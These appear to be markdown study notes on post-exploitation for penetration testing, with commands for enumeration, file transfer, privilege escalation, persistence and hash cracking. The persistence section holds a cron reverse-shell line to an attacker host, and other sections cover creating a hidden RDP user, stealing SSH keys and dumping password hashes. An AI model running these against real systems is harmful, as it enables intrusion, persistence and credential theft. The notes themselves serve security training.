# Overview
Once you [Exploit](Exploitation.md) and gain access to a system then you need to do local enumeration and data gathering as well as seeing if you can gain higher privilege and if possible pivot to more networks in the organization.

## Post-Exploitation Methodology
1. [Local Enumeration](#Local_Enumeration)
2. [Transferring Files](#Transferring_Files)
3. [Upgrading Shells](#Upgrading_Shells)
4. [Privilege Escalation](#Privilege_Escalation)
5. [Persistence](#Persistence)
6. [Dumping and Cracking Hashes](#Dumping_and_Cracking_Hashes)
7. Pivoting
8. Clearing Your Tracks

---

# Local_Enumeration
We are looking for
- system information
	- Hostname
	- OS Name and build
		- patches/packs
		- kernel/distribution
	- OS architecture
	- Applications/Packages
- Users & Privileges
	- who is admins
	- Groups
- networking information
	- routing tables
	- firewall state
	- tcp/udp services
- Processes & Services
	- Scheduled tasks

### Windows
- meterpreter
	- `getuid`
	- `sysinfo`
	- `getprivs`
	- `route`
	- `arp`
	- `ps`
	- `pgrep explorer.exe`
	- `show_mount` : show drives
- MSF Modules
	- `use post/windows/gather/enum_logged_on_users`
	- `use post/windows/gather/win_privs`
	- `use post/windows/gather/checkvm`
	- `use post/windows/gather/enumapplications`
	- `use post/windows/gather/enum_computers` : useful for on domain
	- `use post/windows/gather/enum_patches`
	- `use post/windows/gather/enum_shares`
- shell commands
	- `hostname`
	- `systeminfo`
	- `wmic gfe get Caption,Description,HotFixId,InstalledOn`
		- information about security updates and install date
	- `C:\Windows\System32\eula.txt` : system information on some versions
	- `whoami`
	- `whoami /priv` show enabled privileges
	- `query user` : show logged on users
	- `net users` : show users accounts
	- `net user administrator` : show information on user
	- `net localgroup` : groups on the system
	- `net localgroup Administrators` : information on group
	- `ipconfig /all` 
	- `route print` : routing table information
	- `arp -a` : display arp table
	- `netstat -ano` : display listening services
	- `netsh firewall show state` or 
	- `netsh advfirewall`
	- `netsh advfirewall firewall show` : show firewall state
	- `net start` : show started services
	- `wmic service list brief` : running services info
	- `tasklist /SVC` : processes running w/ PID & service
	- `schtasks /query /fo LIST -v` : schedule task detailed info
- Automated Powershell Script
	- https://github.com/411Hall/JAWS
	- upload to `C:\Temp`
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`

### Linux
- meterpreter
	- `sysinfo`
	- `getuid`
	- `ifconfig`
	- `netstat`
	- `route`
	- `arp`
	- `ps`
- MSF Modules
	- `use post/linux/gather/enum_configs`
	- `use post/linux/gather/enum_network`
	- `use post/linux/gather/enum_system`
	- `use post/linux/gather/checkvm`
- Shell Commands
	- `hostname`
	- `uname -a`
	- `cat /etc/issue` & `cat /etc/*release`
	- `env` : user environment variables
	- `lscpu` : cpu info
	- `df -h` : show data files
	- `lsblk` : list block devices
	- Use package manager to list installed packages
		- `dpkg -l` : Debian package manager
		- `dnf list installed`
		- `rpm -qa` : RedHat package manager
		- `pacman -Q` : Arch
		- `zypper se --installed-only` : OpenSUSE
		- `equery list '*'` : Gentoo
	- `/etc/passwd` : user file
	- `/etc/group` : groups file
	- `/etc/shadow` : passwords file
	- `last` & `lastlog` : last loggin
	- `lastb` : last bad login
	- `ifconfig` or `ip add s`
	- `/etc/hosts` : host file
	- `/etc/resolv.conf`
	- `lsof -iPn` : list open files that are tcp/udp
	- `ps aux` : process info
	- `crontab -l` : list crontab for current user
	- `ls -al /etc/cron*` : crontab files
- Automation Script
	- https://github.com/rebootuser/LinEnum
	- upload to `/temp`
	- add execute permissions and run, output to file

---

# Transferring_Files
- Python Web Server
	- `python -m SimpleHTTPServer 80` : python2 module
	- `python3 -m HTTP.server 80` : python3
- Windows - Download
	- `certutil -urlcache -f http://host/file.exe file.exe`
- Linux - Download
	- `curl`
	- `wget `

---

# Upgrading_Shells
- Non-interactive shell session
	- `/bin/bash -i` : launches bash interactive
	- `cat /etc/shells` to view available shells
	- `python --version` : see if python is available
		- `python -c 'import pty; pty.spawn("/bin/bash")'` : spawn bash
	- `perl -e 'exec "/bin/bash";'`
		- `perl -e 'system("/bin/bash");'`
	- can lookup different languages
- `env` check shell environment, add variables if not existing
	- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
	- `export TERM-xterm`
	- `export SHELL=bash`

---

# Privilege_Escalation
In order to elevate privileges you need to identify a vulnerability on the target. Depends on the operating system and the type of access that you initially get.

## Windows
- Powershell Automated Script
	- https://github.com/itm4n/PrivescCheck
	- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
	- `runas.exe /user:Administrator cmd` : enter password
- Windows Privilege Escalation Awesome Scripts
	- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- Living off the Land Binaries and Scripts Libraries
	- https://lolbas-project.github.io/#

## Linux
- Automated script
	- https://github.com/rebootuser/LinEnum
- Privilege escalation via binaries
	- https://gtfobins.github.io/
- Linux Privilege Escalation Awesome Script
	- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

Sudo
1. `sudo -l` : list out what sudo allows
2. take advantage with [gtfobin](https://gtfobins.github.io/)

Useful
- `find / -not -type l -perm -o+w` : find files with perm or write for others
	- is not file type - symbolic link
- `openssl passwd -1 abc password` : generate hashed password

---

# Persistence
Consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

## Windows
- MSF
	- **Service** : requires elevated privilege
		1. Get meterpreter session
		2. `use exploit/windows/local/persistence_service`
		3. need to set same payload and ports for multi/handler listener
		4. `use multi/handler`
	- **RDP**
		1. Get meterpreter session
		2. `run getgui -e -u <user> -p <pass>` : Enable RDP and create a user, hide the user from the login screen
		3. `xfreerdp /u:<user> /p:<pass> /v:<target>`

## Linux
- SSH - steal key
	1. Download the ssh key from the user `~/.ssh/id_rsa`
		1. use `scp` or `sftp`
	2. `chown 0400 id_rsa` : fix permissions
	3. `ssh user@target -i id_rsa` : use the private key to login
- SSH - generate key
	1. `ssh-keygen -t ed25519` : generate key
	2. `ssh-copy-id [-i [identity_file]] [user@]machine` : copy key to target
- Cronjob
1. Set up crontab entry below.
2. run netcat to listen for connection. `nc nvlp 1234`
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<hostIP>/<port> 0>&1'" > cron ;
crontab -i cron ;
crontab -l
```
- **`>&`**: This redirects both the standard output (`stdout`, file descriptor `1`) and the standard error (`stderr`, file descriptor `2`) to the specified location. In this case, the location is `/dev/tcp/<hostIP>/<port>`.
- **`0>&1`**: This redirects the standard input (`stdin`, file descriptor `0`) to the same destination as the standard output, which is the TCP connection.

---

# Dumping_and_Cracking_Hashes

Windows Information
- Accounts stored in the SAM (Security Accounts Manager)
	- windows kernel locks database file while running
	- file encrypted with syskey
- Authentication facilitated by the LSA (Local Security Authority)
- hashes
	- LN : before Vista
	- NTLM : Vista onward
		- md4

Dumping
- meterpreter - hashdump
	1. `hashdump` : dumps the hashes, requires privileged account
- Mimikatz
Cracking
- John The Ripper
	- `john [options] password-files` : usage
	- `--list=formats` : shows available formats
	- `--format=NT` : specify format/hash type
	- `--wordlist=/usr/share/rockyou.txt` : specify wordlist
- Hashcat

